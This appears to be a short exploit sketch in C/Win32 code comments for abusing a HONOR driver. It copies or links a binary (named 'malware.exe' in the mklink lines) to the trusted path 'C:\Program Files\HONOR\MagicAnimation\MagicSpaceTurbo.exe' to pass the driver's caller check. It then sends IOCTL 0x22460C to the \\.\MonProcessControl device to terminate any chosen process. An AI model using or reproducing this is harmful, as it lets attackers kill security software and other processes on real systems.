// The driver checks that the calling process image path 
// ends with \HONOR\MagicAnimation\MagicSpaceTurbo.exe. So you first put your binary there:

// Create the directory structure
CreateDirectoryW(L"C:\\Program Files\\HONOR", NULL);
CreateDirectoryW(L"C:\\Program Files\\HONOR\\MagicAnimation", NULL);

// Copy yourself there
CopyFileW(myExePath, 
    L"C:\\Program Files\\HONOR\\MagicAnimation\\MagicSpaceTurbo.exe",
    FALSE);
	
// MKLINK ? 

mklink    "C:\Program Files\HONOR\MagicAnimation\MagicSpaceTurbo.exe" "C:\path\to\malware.exe"
mklink /H "C:\Program Files\HONOR\MagicAnimation\MagicSpaceTurbo.exe" "C:\path\to\malware.exe"

// Re-launch from that path and exit

// ->>>>>>>>>>>>>>>>>>>>

HANDLE hDevice = CreateFileW(
    L"\\\\.\\MonProcessControl",
    GENERIC_READ | GENERIC_WRITE,
    0, NULL, OPEN_EXISTING, 0, NULL
);

DWORD pid = /* target PID */;
DWORD bytesReturned;

DeviceIoControl(
    hDevice,
    0x22460C,       // process termination IOCTL
    &pid,
    sizeof(DWORD),
    NULL, 0,
    &bytesReturned,
    NULL
);